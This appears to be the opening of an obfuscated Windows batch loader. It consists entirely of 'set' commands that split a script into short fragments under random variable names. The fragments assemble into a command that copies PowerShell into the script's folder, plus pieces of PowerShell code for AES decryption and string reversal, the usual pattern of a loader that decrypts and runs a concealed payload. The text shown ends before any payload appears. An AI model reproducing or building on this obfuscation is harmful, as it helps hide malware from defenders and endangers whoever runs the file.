@echo off
set "RuImaUMSIc=Sy"
set "GwTbaVMEpf=ow"
set "XQioWAnsDX=he"
set "bOnyDLnlpK=co"
set "PRnyRQfQro= C"
set "GrqsBxYSJn=rs"
set "ktmCfEZkVo=py"
set "iUVnFLCThG=\W"
set "numKbyRkTg=we"
set "njNqtMFCGe=we"
set "utKuDHQKla=ll"
set "JoGImaRbBK=:\"
set "QDbENozixG=ws"
set "cecLSVYKif=Wi"
set "NniWPIhzYy=Po"
set "IYNGBOLHuq=.e"
set "zNQKMwYFUJ=in"
set "TTaqPWLlWx=rS"
set "hlXsFeaoHl=ll"
set "MFfYNVVGMA=he"
set "NwptGBSJTR=do"
set "NXIllKOBGV=s\"
set "oPCOZkAPHN=nd"
set "vYjLVmOHag=32"
set "JXBsNUmSgT=\v"
set "juvcrqgqCp=em"
set "xKkxFNSyxZ=y "
set "cxgnpIpnWf=xe"
set "ClxsYutXNx= /"
set "fbZVOapPBb=po"
set "WVCABxbyuT=1."
set "zbuOdFkbLW=st"
set "zmYIJziGNi=0\"
set "WuGvxyAtRK=cd"
set "UdpjYEVAot= %~dp0"
set "vsIzUECgvX=-joi"
set "IRzqQkItbW=;$nZ"
set "dMCSwEpTxZ=trea"
set "yCAQeGmQce=File"
set "kuPZDgzjCs=ewLi"
set "VhEniiQxdx=.Key"
set "wSGIivFamO=BC;$"
set "iZWSyJHTfl=XdKR"
set "BVeqHzVmka=T.Su"
set "JljHpfARWs=esMa"
set "jFctKVAJYM=; };"
set "fzPbFDWfqP=tem."
set "eRVbxUcxsA=pres"
set "HOrsPMGChA=lBlo"
set "SDgzOxgudI=;$bs"
set "TLsBtVVtqk=]::("
set "mREUQnXMos=16] "
set "xMcrIoeDmZ=$OfA"
set "KgKQDHSILQ=fjKB"
set "kUrHZyPeDp=.Dis"
set "dqSkExOsCO=ddin"
set "bQgGHUAvTg=GE ="
set "huwHVnFbxf=tion"
set "gzdOPULvPC=ionM"
set "iqKFahvggT= [Sy"
set "mBHSxYQzmX=.Cry"
set "VdtIyqfIPh=em.C"
set "cpgCNyFQyI=d;$f"
set "OzjJlpNtBJ=nage"
set "KHWpUhxrDb=6] -"
set "vhfeIBMSkD=orF'"
set "PtKLsSySoQ=vj0m"
set "nUBWpGPYTU=6esa"
set "xfrtWEpOUF=1..-"
set "YoHyhWsjlq=$qqs"
set "UMbbJOYtGW=$JAp"
